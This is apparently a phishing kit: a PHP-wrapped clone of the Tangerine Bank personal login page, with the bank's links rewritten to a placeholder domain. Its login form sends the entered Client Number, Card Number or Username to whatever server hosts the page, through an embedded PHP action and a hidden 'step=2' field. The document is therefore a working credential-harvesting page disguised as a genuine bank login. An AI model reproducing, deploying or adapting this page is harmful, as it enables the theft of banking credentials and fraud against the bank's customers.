<META http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<link rel="shortcut icon" href="css/favicon.ico" />
<link rel="stylesheet" href="css/core.min.css">
<link rel="stylesheet" href="css/layout.css">
<link rel="stylesheet" href="css/module.css">
<link rel="stylesheet" href="css/state.css">
<meta name="author" content="Tangerine Bank">
<meta name="COPYRIGHT" content="Copyright (c) 2014 Tangerine">
<meta name="description" content="At Tangerine you never pay services fees. Your savings account earns a high rate of interest, requires no minimum balance, and your money is never locked in. Save Your Money with Tangerine. Our Loan Account and Mortgage products are industry leading, and investing options are available with our Mutual Funds. ">
<meta name="FORMAT" content="text/html">
<meta name="apple-itunes-app" content="app-id=847844097">
<meta name="google-play-app" content="app-id=ca.tangerine.clients.tablet&amp;hl=en">
<meta name="KEYWORDS" content="bank, banking, Canadian banks, financial services, Internet banking, electronic commerce, PC banking, ABM, telephone banking, business banking, business accounts, savings accounts, loans, mortgages, mutual funds, virtual bank, Virtual banking, great interest rates, Alternative banking, CDIC,ING, ING Bank, Web banking, GIC, RRSP, RSP,Performance, Save Your Money, Interac, Mastercard, Maestro, U.S. dollar, Cirrus">
<meta name="TITLE" content="Tangerine">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="cache-control" content="no-cache, no-store">
<noscript>
<meta http-equiv="refresh" content="0; Url=en_CA/web/BrowserSettings.html">
</noscript>
<title>Tangerine bank: Personal Account Login</title>
<script src="css/modernizr.js"></script>
</head>
<body>
<div class="viewport">
<div class="frame">
<div id="popout-nav" class="menu collapse">
<header class="mobile-menu-header">
<div class="mobile-menu-header-left">
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">Log me in</a>
</div>
<div class="mobile-menu-header-right">
<div class="btn-group">
<a class="btn btn-warning active" type="button">EN</a><a class="btn" type="button" href="http://www.site.com/fr/index.html">FR</a>
</div>
</div>
</header>
<ul class="mobile-menu-nav">
<li>
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-savings" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-savings">
<a class="mobile-dropdown-item" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-chequing" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-chequing">
<a href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mutual-funds" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mutual-funds">
<a class="mobile-dropdown-item" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mortgages" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mortgages">
<a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-ways-to-bank" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-ways-to-bank">
<a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Debit Card</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
<li class="seperator"></li>
<li class="mobile-static">
<a href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/accounts-rates/ourrates/index.html">Rates</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li class="mobile-static">
<a href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/faq/">FAQ</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/about-us/index.html">About us</a>
</li>
</ul>
</div>
<div class="view">
<section class="mobile-header-top hidden-desktop">
<div class="navbar-inner">
<button type="button" class="btn btn-navbar btn-menu" id="mobile-btn-open-nav" data-target="#popout-nav"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><img src="css/tangerine_lockup.jpg" alt="Tangerine logo" width="160"><button class="btn btn-navbar btn-search icon-search collapsed" type="button" data-toggle="collapse" data-target="#mobile-header-search"></button>
</div>
<div class="collapse" id="mobile-header-search">
<form name="gs" method="GET" action="http://www.site.com/search">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search" tabindex="-1">
</form>
</div>
</section>
	
		
			
<section class="header-top visible-desktop">
<div class="container">
<div class="header-top-menu">
<a class="header-top-menu-link" href="http://www.site.com/en/about-us/index.html">About us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/about-us/contact-us/index.html">Contact us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/faq/">FAQs</a> |     

              <a href="http://www.site.com/fr/index.html">Francais</a> |
                  <a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA"><b>Log me in</b></a>
</div>
</div>
</section>
<section class="header-main visible-desktop">
<div class="container">
<div class="row-fluid">
<div class="span3">
<a href="http://www.site.com/en/" class="header-main-logo"><img src="css/tangerine_lockup.jpg" alt="Tangerine logo" width="200" height="50"></a>
</div>
<div class="span9">
<div class="header-main-menu">
<form name="gs" method="GET" action="http://www.site.com/search" class="pull-right">
<ul>
<li>
<a class="header-main-menu-link" href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/rates/">Rates</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li>
<a class="header-main-menu-link" href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
</ul>
<div class="input-append">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search"><button class="btn btn-secondary" type="submit"><i class="icon-search"></i></button>
</div>
</form>
</div>
</div>
</div>
</div>
</section>
<section class="nav-main">
<div class="container">
<nav class="navbar">
<ul class="nav dropdown">
<li class="active">
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Client Card</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
</ul>
</nav>
</div>
</section>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	
	
<section class="content">
<div class="container">
<div class="row-fluid">
<div class="span12 content-span">
<div class="content-main">
	
<div class="row-fluid">
<div class="login">
<div class="span6 content-main">
<form action="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']?>?" name="Signin" method="POST">

<input name="step" type="HIDDEN" value="2"><input name="locale" type="HIDDEN" value="en_CA"><input name="device" type="HIDDEN" value="web"><input name="pm_fp" type="HIDDEN" id="pm_fp"><input name="DST" type="HIDDEN" value=""><input name="cafemode" type="HIDDEN" value=""><input name="refNumber" type="HIDDEN" value="">
<fieldset>
<div class="content-main-wrapper">
<div class="mobile-wrapper">
<h1>Personal Banking Login</h1>
<label for="ACN" class="login-main-label">
    					   Enter your Client Number, Card Number or Username
                           <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="Your Client Number can be found on the upper right-hand corner of your statement. The Tangerine Client Card is the card for debit and ABM transactions that is sent to Tangerine Chequing Account Clients. You can enter this Card Number instead of your Client Number if you like. If you've created a Username, you can also use that to log in."></i></label>
<div id="divCNText" style="display:block">
<input type="text" autofocus="autofocus" maxlength="40" name="ACN" autocomplete="OFF" id="ACN" value="" class="input-login"  style="min-height:20px !important">
<div class="control-group">
<div class="controls">
<label class="checkbox"><input type="checkbox" name="cbRemember" id="cbRemember" data-target="#nameit" data-toggle="collapse" class="input-login-remember-me">Remember me
             <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="When you use this, we'll save your Client Number, Card Number or Username so that you don't have to enter it the next time you bank online from this computer. For security, you won't want to do this on a publicly shared computer, like at the library. To remove your Client Number, Card Number or Username from this computer, select the &quot;Remove this Client Number, Card Number or Username &quot; box the next time you log in."></i></label>
</div>
</div>
<div class="collapse" id="nameit">
<label for="description">Name it</label><input style="min-height:20px !important" type="text" maxlength="24" name="tbNickname" id="tbNickname" autocomplete="OFF"><span class="help-block">Example: "Mom's money" (this is optional)
    	       <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="You can give your Client Number or Card Number a nickname so that it's easier to recognize if there is more than one saved on the same computer. It's not safe to have your PIN, Client Number or Username displayed as part of this nickname."></i></span>
</div>
</div>
<div id="divCNDropDown" style="display:none">
<div class="btn-group">
<a href="#" data-toggle="dropdown" class="btn dropdown-toggle visible-desktop ">
                  Please select
                <span class="icon-caret-down"></span></a>
<ul class="dropdown-menu">
<li>
<a data-value="addAnother" href="javascript:addAnotherNumber();">Use another Client Number</a>
</li>
</ul>
<select class="hidden-desktop" name="ddCIF" id="ddCIF"><option value="addAnother">Use another Client Number</option></select>
</div>
</div>
<div id="divRemoveNo" class="control-group" style="display:none">
<div class="controls">
<label class="checkbox"><input type="checkbox" name="cbRemoveNo" id="cbRemoveNo" value="Remove">
          Remove this Client Number, Card Number or Username from the saved list on this computer
          <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="To remove your Client Number, Card Number or Username from the saved list on all computers, log in to update your security settings."></i></label>
</div>
</div>
</div>
</div>
<div class="button-holder">
<a href="/web/Tangerine.html?command=displayCIFRetrieval" class="forgot-login-link">Forgot your login?</a><a href="/web/Tangerine.html?command=displayBusinessLoginRegular" class="switch-banking-type">Go to business banking login</a><button class="btn btn-primary" type="submit" name="Go" id="GoBtn">Go</button>
</div>
</fieldset>
</form>
</div>
<div class="span6 hidden-phone">
<div class="ad-banner" data-toggle="injector" data-remote="http://www.site.com/images/en/login/login.html"></div>
</div>
</div>
</div>
<div class="tipsafe">
<div class="row-fluid">
<div class="span6">
<div class="left-banner">
<strong>Member of <a href="http://www.site.com/en/about-us/cdic/index.html">Canada Deposit Insurance Corporation</a></strong>
</div>
</div>
<div class="span6">
<div class="safe visible-desktop">
<a href="http://www.site.com/en/security/guarantee/index.html" class="security-logo" data-popupWin="true" data-popupWin-name="popupWindow" data-popupWin-features="height=800,width=750,scrollbars=yes,resizable=yes,top=50,left=50,screenX=50,screenY=50,location=no,toolbar=yes"><b class="security-logo-text">Security&nbsp;</b><img src="../../images/bootstrap/sg-shield.svg" width="30" height="25"><b class="security-logo-text">&nbsp;Guarantee</b></a>
                 | 
                 <a href="http://www.site.com/en/security/trusteer/index.html" class="download-trusteer" data-popupWin="true" data-popupWin-name="popupWindow" data-popupWin-features="height=800,width=800,scrollbars=yes,resizable=yes,top=50,left=50,screenX=50,screenY=50,location=no,toolbar=yes"><b class="download-trusteer-text">Download&nbsp;</b><img src="../../images/bootstrap/trusteer-logo.svg" width="55" height="11"></a>
</div>
</div>
</div>
</div>
<div class="alert alert-info alert-block">
<strong>Your CDIC coverage remains the same.</strong>
<br>
		The name change of ING DIRECT to Tangerine does not affect your CDIC coverage. Eligible deposits will continue to be protected for up to $100,000.
     </div>
	
</div>
</div>
</div>
</div>
</section>

<footer class="footer" id="main-footer">
<div class="container">
<div id="footer-body" class="footer-body">
<div class="row-fluid">
<div class="span12">
<h1>We're here for you</h1>
</div>
</div>
<div class="row-fluid">
<div class="span4">
<h3>Phone us</h3>
<div>
<dl>
<dt>Give us a call 24 hours a day, 7 days a week at</dt>
<dd class="footer-tel">1-800-464-3473</dd>
</dl>
</div>
<h3>Chat us up</h3>
<p>Chat availability <br>Weekdays: 8am &#239;&#191;&#189; 8pm ET <br>Weekend: 9am &#239;&#191;&#189; 5pm ET</p>
<div>
<p>
<span id="chat-unavailable" class="is-hidden">Sorry, there are no Direct Associates available at the moment.</span><span id="chat-available" class="">
                                Get the conversation started &#239;&#191;&#189;
      							<a id="ChatBtn" href="javascript:ClickToChat(24);">Chat with us</a><script type="text/javascript">
	                  	function ClickToChat(input){
												window.open ("http://ing-eng.frontlinesvc.com/app/chat/chat_landing/prod/"+input,"chat","menubar=1,resizable=1,width=350,height=450");
											}
	                  </script></span>
</p>
</div>
</div>
<div class="span4">
<h3>Email us</h3>
<div>
<dl>
<dt>For general questions or inquiries</dt>
<dd>
<a href="mailto:clientservices@site.com">clientservices@site.com</a>
</dd>
</dl>
</div>
<h3>Visit us</h3>
<p>Come visit us at one of our <a href="http://www.site.com/en/ways-to-bank/cafe/index.html">Tangerine Cafes</a>
</p>
</div>
<div class="span4">
<h3>Get social with us</h3>
<div>
<div class="social-links">
<a href="http://twitter.com/TangerineBank" class="icon-twitter-sign" title="Twitter" target="_blank"></a><a href="http://www.facebook.com/TangerineBank" class="icon-facebook-sign" title="Facebook" target="_blank"></a><a href="http://www.linkedin.com/company/tangerine-bank" class="icon-linkedin-sign" title="LinkedIn" target="_blank"></a><a href="http://instagram.com/TangerineBank" class="icon-instagram" title="Instagram" target="_blank"></a><a href="http://www.youtube.com/TangerineBank" class="icon-youtube-sign" title="YouTube" target="_blank"></a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="footer-navbar">
<div class="container">
<div class="row-fluid">
<div class="span12">
<div id="footer-see-more" class="footer-see-more">
<a>Contact us<i class="icon-caret-up"></i></a>
</div>
<ul class="footer-links-bottom">
<li>
<a href="http://www.site.com/en/about-us/careers/index.html">Careers</a>
</li>
<li>
<a href="http://www.site.com/en/privacy/index.html">Privacy</a>
</li>
<li>
<a href="http://www.site.com/en/legal/index.html">Legal</a>
</li>
<li>
<a href="http://www.site.com/en/security/index.html">Security</a>
</li>
<li>
<a href="http://www.site.com/en/sitemap/index.html">Site&nbsp;map</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div>
<script>
      //Default value - set to true on xsl's to bypass default keypress handler
      var doCustomKeypress = false;
    </script>
<div id="modalStatus" style="display:none">true</div>
<div id="RefreshLinkSection" style="display:none">/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA</div>
<script src="css/jquery.min.js"></script><script src="css/bootstrap.min.js"></script><script src="css/custom-plugins.js"></script><script language="javascript">
      !function ($) {
        $('[data-popupWin="true"]').click(function(){
          var popupName = $(this).attr('data-popupWin-name');
          var features = $(this).attr('data-popupWin-features');
        
          if ($(this).is('a')) {
            window.open($(this).attr('href'), popupName, features);
            return false;            
          }
          else if (($(this).is('input') || $(this).is('button')) && ($(this).attr('type') == 'submit')) {
            window.open('', popupName, features);
            $('#' + $(this).attr('data-popupWin-form')).attr('target', popupName);            
          }
        })
      }(window.jQuery);
    </script><script language="javascript">
          var len= $('script').filter(function(){
            return ($(this).attr('src') == 'css/bootstrap.min.js'); 
          }).length;
          
          if (len==0){
            $.getScript("css/bootstrap-tooltip.js");
            $.getScript("css/bootstrap-transition.js");
          }
        </script><script language="javascript">
            //TQA00355569 - already done in custom-plugins.js
		    //$('[data-toggle="tooltip"]').tooltip();
	  	</script><script language="JavaScript" src="css/pm_fp.js"></script><script language="JavaScript" src="css/login.js"></script><script language="JavaScript" src="css/cookie.js"></script>
<meta xmlns:xalan="http://xml.apache.org/xslt" name="DCSext.locale" content="en_CA">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="DCSext.device" content="web">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="DCSext.flavour" content="web">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.cg_n" content="Auth">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.cg_s" content="Login">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.si_n" content="Auth_Login">
<meta xmlns:xalan="http://xml.apache.org/xslt" name="WT.si_p" content="ValidateWebCIF">
<script xmlns:xalan="http://xml.apache.org/xslt" src="css/securewtinit.js" type="text/javascript"></script><script xmlns:xalan="http://xml.apache.org/xslt" src="css/securewtbase.js" type="text/javascript"></script>
<noscript xmlns:xalan="http://xml.apache.org/xslt">
<div>
<img alt="DCSIMG" id="DCSIMG" width="1" height="1" src="http://info.site.com/dcsqfhp5v10000082npv8ae8i_1k4j/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=8.0.2"></div>
</noscript>
<script xmlns:xalan="http://xml.apache.org/xslt" type="text/javascript">
				if ((/iphone|ipod|ipad.*os 5/gi).test(navigator.appVersion)) {
					window.onpageshow = function(evt) {
					// If persisted then it is in the page cache, force a reload of the page.
						if (evt.persisted) {
							document.body.style.display = "none";
							location.reload();
						};
					};
				};
		</script><script xmlns:xalan="http://xml.apache.org/xslt" type="text/javascript">
				function invalidateBackCache() {
					// necessary for Safari: mobile desktop
				};
				if(window.addEventListener){
					window.addEventListener("unload", invalidateBackCache, false);
				};
		</script><script xmlns:xalan="http://xml.apache.org/xslt" LANGUAGE="JavaScript">
				function linkTracker(file, description){
				
						dcsMultiTrack(
							'DCS.dcsuri', file,
							'WT.ti',      description);
					
				}
				</script>
<meta xmlns:xalan="http://xml.apache.org/xslt" http-equiv="Refresh" content="1560; URL=/web/InitialTangerine.html?command=displayLoginRegular&amp;device=web&amp;locale=en_CA&amp;timeout=1">
<script type="text/javascript" src="css/splash.js" charset="utf-8"></script><script>
      try{
        checkIfMobileSplash('en_CA');
      }catch (e){
        //silent fail
      }

      $(document).ready(function() {
        //Test if browser supports cookies        
        setCookie('Name','Tangerine');
        if(getCookie('Name') != null) {
          // browser supports cookies, delete cookie
          document.cookie = "Name=deleted; expires=Thu, 01 Jan 1970 00:00:00 GMT";
          
          //Sets focus on field
          focusOnCnField();
                    
          //Sets pm_fp hidden field
          $("#pm_fp").val(encode_deviceprint());
        }
        else {
          // browser DOES NOT support cookies
          window.location.href="BrowserSettings.html";          
        }

        //Event handler on Select change
        $('#ddCIF').on("updated.dropdown", checkAddAnother)
        
        //TQA00352652
        
          $('#ddCIF option:first').prop('selected','selected');
        

		//TQA00397608
        if ($('#cbRemember').attr("checked")==true) {
        	$('#cbRemember').attr("checked",true);
		} else {
			$('#cbRemember').attr("checked",false);
		}
        
      })

      function handleKeyPress(e){
        var key=e.keyCode || e.which;
        if (key==13){
          $('#CancelButton').val('true')
          $('#Signin').submit();
        }
      }
    </script><script>
      var touch = $('html').hasClass('touch') 
      if (!doCustomKeypress && !touch) {
        //Handle Enter keypress on input fields (excluding submit input buttons and Search input from top menu section) to trigger Form Submit
        $('input, select, .dropdown-toggle').not('[type=submit], .input-search').on('keypress', function(e){
          var key = e.keyCode || e.which;
          if ( key === 13 && $('.btn-primary').length ) {
            e.preventDefault(); 
            $('.btn-primary').not('[data-dismiss=modal]').last().trigger('click') //trigger first btn-primary button
          }
        })
      }
    </script>
</body>
</html>

<?

}

?>